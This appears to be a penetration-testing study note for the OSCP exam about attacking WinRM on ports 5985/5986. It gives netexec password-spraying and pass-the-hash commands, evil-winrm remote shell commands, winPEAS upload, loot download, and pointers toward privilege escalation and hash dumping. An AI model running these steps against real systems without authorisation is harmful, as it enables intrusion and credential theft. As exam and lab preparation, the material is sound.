# 🔧 WinRM — Ports 5985 / 5986

> **Windows Remote Management** (SOAP-over-HTTP(S), PowerShell remoting; 5985 HTTP, 5986 HTTPS). NTLM/Kerberos auth, domain or local creds, **pass-the-hash supported**. On OSCP this is a **shell delivery service**: if you have valid Windows creds/hash and the user is in **Administrators** or **Remote Management Users**, `evil-winrm` gives an interactive PowerShell shell. Not an exploit surface itself — an *access* surface. The classic "cracked a hash → get the shell" endpoint.

Related: [[Credential Attacks]] · [[SMB]] · [[Active Directory]] · [[Windows Privilege Escalation]] · [[Shells]]

---

## 🧠 PORT 5985/5986 → THINK
- **Have Windows creds/hash?** → `evil-winrm` for a shell.
- **5985** = HTTP, **5986** = HTTPS. Same idea, add `-S` for TLS.
- **Not just admins:** members of *Remote Management Users* can log in — check every cred.
- No creds yet → WinRM is a **destination**; go find creds (SMB/web/AD), then come back.
- Pairs with [[SMB]] (`netexec winrm` shows `(Pwn3d!)`).

## ⚡ QUICK TRIAGE (60 sec)
```bash
export IP=10.10.10.10
```

```bash
nmap -p5985,5986 -sV $IP
```

```bash
netexec winrm $IP -u user -p pass         # test a cred; (Pwn3d!) = you get a shell
```
**Verdict:** have a cred that returns `(Pwn3d!)` → `evil-winrm` now. No creds → find some first.

## ⏱️ ENUMERATE
```bash
# Test creds / hashes across a userlist
netexec winrm $IP -u users.txt -p passwords.txt --continue-on-success
```

```bash
netexec winrm $IP -u user -H <NThash>              # pass-the-hash
```

```bash
# Get the shell
evil-winrm -i $IP -u user -p 'Password1'
```

```bash
evil-winrm -i $IP -u user -H <NThash>              # PtH
```

```bash
evil-winrm -i $IP -u user -p pass -S               # 5986 / HTTPS
```

```bash
evil-winrm -i $IP -u user -p pass -S -c cert.pem -k key.pem   # 5986 w/ certs (rare)
```
**Look for:** any cred that authenticates (green `(Pwn3d!)` in netexec) → interactive shell.

## 🗡️ EXPLOIT
- 🟢 **Credential/hash reuse → shell** (the whole point).
- 🟡 **Password spray** a userlist against WinRM (mind lockout).
- After shell: 🟢 **upload winPEAS/PowerUp** → [[Windows Privilege Escalation]].

**Inside evil-winrm** (one command per block — copy-paste each individually; `upload`/`download` are built in):

Identity, privileges, group memberships (check for `SeImpersonate`):
```powershell
whoami /all
```
Hostname:
```powershell
hostname
```
Full system/patch info (feed to WES-NG for missing-patch privesc):
```powershell
systeminfo
```
Upload winPEAS:
```powershell
upload winPEASx64.exe
```
Run winPEAS on the target:
```powershell
.\winPEASx64.exe
```
Pull a loot file back to Kali:
```powershell
download C:\path\to\loot.txt
```
- `SeImpersonate` present → PrintSpoofer/GodPotato → SYSTEM ([[Windows Privilege Escalation]]).
- Then dump hashes (if admin) → secretsdump/reuse → [[Credential Attacks]] / [[Active Directory]].

## 🔁 FOUND → NEXT
| FINDING | MEANING | NEXT | RESULT |
|---|---|---|---|
| Cred authenticates | Shell available | `evil-winrm` | interactive PS |
| `(Pwn3d!)` in netexec | Remote mgmt allowed | evil-winrm | shell |
| Only NT hash | PtH | `evil-winrm -H` | shell |
| Shell, low priv | Escalate | winPEAS/PowerUp | SYSTEM path |
| Admin shell | Loot | dump SAM/LSA | reuse/AD |

## 🚧 FAILED → NEXT
| Problem | Do this |
|---|---|
| Cred rejected | User not in Remote Mgmt Users/Admins — try other creds; use SMB/RDP instead |
| No creds yet | Go get them (SMB shares, web, AS-REP/Kerberoast), then return |
| 5986 TLS errors | Add `-S`; ignore cert with evil-winrm defaults |
| Shell unstable | Prefer evil-winrm over raw; use `-r` realm for Kerberos if needed |
| WinRM open but SMB says not admin | Some users are RM-only; still try evil-winrm with that user |

## 📋 REFERENCE — mistakes · don't-miss · stop
**Mistakes:** assuming you need **admin** (*Remote Management Users* also works — test every cred) · forgetting **pass-the-hash** (`-H`) · not using evil-winrm's built-in **upload/download** for tooling · ignoring WinRM because "no creds" (it's the payoff for creds you'll find later).
**Reuse:** any Windows cred/hash → also test [[SMB]], [[RDP]], [[MSSQL]], [[LDAP]]. WinRM is one spoke of the reuse matrix in [[Credential Attacks]].
**Don't miss:** test **every** found cred/hash against WinRM · try **non-admin** users (Remote Mgmt Users) · pass-the-hash (`-H`) · `-S` for 5986 · upload winPEAS via evil-winrm → privesc.
**Stop when:** no creds → WinRM is dormant; move on and return when you have a credential. With a shell → work shifts to [[Windows Privilege Escalation]].

## 📇 CHEAT SHEET
```bash
nmap -p5985,5986 -sV $IP
```

```bash
netexec winrm $IP -u users.txt -p passwords.txt --continue-on-success   # find (Pwn3d!)
```

```bash
evil-winrm -i $IP -u user -p 'pass'         # shell
```

```bash
evil-winrm -i $IP -u user -H <NThash>       # PtH shell
```

```bash
evil-winrm -i $IP -u user -p pass -S        # 5986 HTTPS
# in-shell: upload winPEASx64.exe ; whoami /priv
```
**Kill shots:** cred/hash → evil-winrm shell → `whoami /priv` → SYSTEM.
